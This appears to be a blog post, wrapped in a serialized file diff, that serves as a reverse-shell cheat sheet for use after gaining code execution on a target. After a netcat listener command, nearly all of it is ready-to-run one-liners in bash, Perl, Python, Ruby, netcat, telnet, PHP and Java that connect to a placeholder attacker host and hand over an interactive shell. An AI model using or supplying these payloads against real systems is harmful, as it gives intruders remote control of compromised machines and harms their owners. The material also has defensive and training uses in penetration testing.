@@ -1,0 +1,62 @@
+I"t<p>There might be several occasions where you might have code execution on a target machine and you sit there wondering what to do next.</p>
+
+<p>Well here is what you can do. Setup <strong>netcat</strong> listener on port <strong>4444</strong>.</p>
+<pre><code class="language-bash">nc -nvlp 4444
+</code></pre>
+<p>Bash</p>
+<pre><code class="language-bash">exec /bin/bash 0&amp;0 2&gt;&amp;0
+
+0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196
+
+exec 5&lt;&gt;/dev/tcp/attackerip/4444
+cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done  # or:
+while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done
+
+bash -i &gt;&amp; /dev/tcp/attackerip/4444 0&gt;&amp;1
+</code></pre>
+<!-- more -->
+<p>Perl</p>
+<pre><code class="language-perl">//Does not depend on /bin/sh
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'
+
+//Windows target
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'
+
+//Could try this one also. (*nix /bin/sh)
+perl -e 'use Socket;$i="attackerip";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
+</code></pre>
+<p>Python</p>
+<pre><code class="language-python">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attackerip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+</code></pre>
+<p>Ruby</p>
+<pre><code class="language-ruby">//Does not depend on /bin/sh
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+//Windows Target
+ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+//*nix /bin/sh
+ruby -rsocket -e'f=TCPSocket.open("attackerip",4444).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'
+</code></pre>
+<p>Netcat</p>
+<pre><code class="language-bash">nc attackerip 4444 -e /bin/sh
+/bin/sh | nc attackerip 4444
+rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4444 0/tmp/p
+</code></pre>
+<p>Telnet</p>
+<pre><code class="language-bash">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet attackerip 4444 0/tmp/p
+Or:
+telnet attackerip 4444 | /bin/bash | telnet attackerip 4445
+# Setup listener on attcker machine on port 4445/tcp
+</code></pre>
+<p>PHP</p>
+<pre><code class="language-php">php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
+# This code assumes that the TCP connection uses file descriptor 3. 
+# If it doesn’t work, try 4, 5, 6…
+</code></pre>
+<p>Java Reverse Shell</p>
+<pre><code class="language-java">r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/ATTACKING-IP/80;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
+p.waitFor()
+</code></pre>
+:ET
